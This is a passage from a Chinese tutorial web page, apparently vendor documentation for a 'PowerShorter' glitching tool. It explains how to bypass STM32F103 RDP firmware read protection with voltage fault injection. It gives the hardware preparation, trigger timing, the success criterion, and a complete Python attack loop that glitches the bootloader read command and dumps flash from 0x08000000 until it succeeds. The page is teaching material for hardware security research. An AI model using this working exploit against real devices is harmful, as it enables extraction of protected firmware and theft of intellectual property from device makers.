+<p>开发板上的电容具有储能的特性，如果在一个具有巨大电容的电源线上进行电压短路故障注入，电压会缓慢下降到零，达不到我们期望的效果，因此我们需要把电容去除（这里仅以某型号 STM32F103 开发板为例，具体需根据卖家给的原理图自己查找）</p>
+<p><img alt="image-20241210123901212" src="../img/image-20241210123901212.png" /></p>
+<p>我们的 STM32F103 核心板只是个小开发板，不是什么复杂的系统，所以可以放心的多去几个电容试试</p>
+<p><img alt="image-20241210124003330" src="../img/image-20241210124003330.png" /></p>
+<h3 id="_6">故障注入时遇到的问题</h3>
+<p>1、如何控制设备重启（重启）</p>
+<p>​   答：通过 PowerShorter 设备的 GPIO 为 STM32 供电，Python 代码控制 GPIO</p>
+<p>2、打哪个地方的电压、如何打（毛刺物理位置、CPU 核心供电、短路毛刺、毛刺宽度）</p>
+<p>​   答：直接打 VDD 供电引脚；短接 VDD 和 GND 使其电压短暂拉低</p>
+<p>3、什么时候打故障（毛刺时间位置、触发、延时）</p>
+<p>​   答：以 \x11\xEE 发送时在 A10 上产生的第 6 个上升沿作为触发，打在上升沿14.44us 内</p>
+<p>4、怎么判断是否打成功了（故障结果反馈）</p>
+<p>​   答：判断 \x11\xEE 返回的结果，为 \x79 则表示故障成功</p>
+<h3 id="_7">硬件接线参考</h3>
+<p><img alt="image-20241210124235825" src="../img/image-20241210124235825.png" /></p>
+<h3 id="_8">成功波形参考</h3>
+<p><img alt="image-20241210124749187" src="../img/image-20241210124749187.png" /></p>
+<h3 id="_9">攻击脚本参考</h3>
+<p>导入相关库</p>
+<pre><code class="language-python">from power_shorter import *
+import time
+import serial
+import faultviz
+import random
+</code></pre>
+<p>初始化设备</p>
+<pre><code class="language-python">ps_dev = PowerShorter(&quot;com86&quot;)
+</code></pre>
+<p>给设备上下电，检查是否能够正常重启</p>
+<pre><code class="language-python">ps_dev.gpio(GPIO.GPIO1, 0)
+time.sleep(1)
+ps_dev.gpio(GPIO.GPIO1, 1)
+</code></pre>
+<p>初始化 faultviz 服务与表单</p>
+<pre><code class="language-python">faultviz.start_view_service(port=12345) 
+vt = faultviz.ViewWidget()
+</code></pre>
+<p>定义 Uart Bootloader 中地址格式转化函数</p>
+<pre><code class="language-python">def gen_addr(addr_int):
+    addr_checksum = 0
+    addr_bytes = addr_int.to_bytes(4,byteorder=&quot;big&quot;)
+    for i in addr_bytes:
+        addr_checksum ^= i
+    return addr_bytes + addr_checksum.to_bytes(1,byteorder=&quot;big&quot;)
+</code></pre>
+<p>初始化串口小板</p>
+<pre><code class="language-python">s = serial.Serial('com50', 115200, parity=serial.PARITY_EVEN, timeout=0.5)
+</code></pre>
+<p>定义攻击函数</p>
+<pre><code class="language-python">def stm32_attack():
+    ps_dev.gpio(GPIO.GPIO1, 0)
+    time.sleep(0.3)
+    ps_dev.gpio(GPIO.GPIO1, 1)
+    glitch_delay = random.randint(990, 1050)
+    glitch_pulse = random.randint(15, 30)
+
+    ps_dev.engine_cfg(Engine.E1, [(0, glitch_delay), (1, glitch_pulse), (0, 1)], TRIGGER_MODE.RISE,1 ,6)    # 设置毛刺上升沿六次触发
+    s.write(b'\x7f')
+    res1 = s.readall().hex()
+
+    ps_dev.arm(Engine.E1)        # 发送 0x11 0xEE 前激活毛刺
+    s.write(b'\x11\xee')
+    res2 = s.read(1).hex()
+    if res2 == '79':             # 若返回 79 则表示成功绕过 RDP
+        status = &quot;Success&quot;
+        s.write(gen_addr(0x08000000))   # 发送要读取的地址
+        res3 = s.read(1).hex()
+        s.write(b'\xff\x00')            # 发送要读取的 size
+        res4 = s.read(257).hex()        # 接收读取的数据
+        result = res1+res2+res3+res4
+        vt.update(state = status, delay = glitch_delay, pulse = glitch_pulse, result = str(result))
+        return 0
+
+    else:
+        status = &quot;Normal&quot;
+        result = res1 + res2  
+        vt.update(state = status, delay = glitch_delay, pulse = glitch_pulse, result = str(result))
+        return 1
+</code></pre>
+<p>执行一次攻击函数，检查代码是否有问题</p>
+<pre><code class="language-python">stm32_attack()
+</code></pre>
+<p>查看表单，检查刚才的攻击是否将结果添加到表单中</p>
+<pre><code class="language-python">vt.show()
+</code></pre>
+<p>写个循环，直到成功绕过 RDP 才停止攻击，循环过程中故障参数及结果会不断添加到 vt 表单中，配合示波器调整参数，优化毛刺位置</p>
+<pre><code class="language-python">attackflag = 1
+while(attackflag):
+    attackflag = stm32_attack()
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="页脚" >
+        
+          
+          <a href="../../%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/PowerShorter%E5%BC%80%E7%AE%B1%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" class="md-footer__link md-footer__link--prev" aria-label="上一页: PowerShorter开箱与简单使用">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                上一页
+              </span>
+              <div class="md-ellipsis">
+                PowerShorter开箱与简单使用
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/" class="md-footer__link md-footer__link--next" aria-label="下一页: nRF52 电压故障注入绕过 APPROTECT 固件读保护">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                下一页
+              </span>
+              <div class="md-ellipsis">
+                nRF52 电压故障注入绕过 APPROTECT 固件读保护
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["announce.dismiss", "navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "search.share", "navigation.indexes", "content.tabs.link", "content.tooltips", "content.code.copy", "content.action.edit", "content.action.view", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.60a45f97.min.js"></script>
+      
+    
+  </body>
+</html>
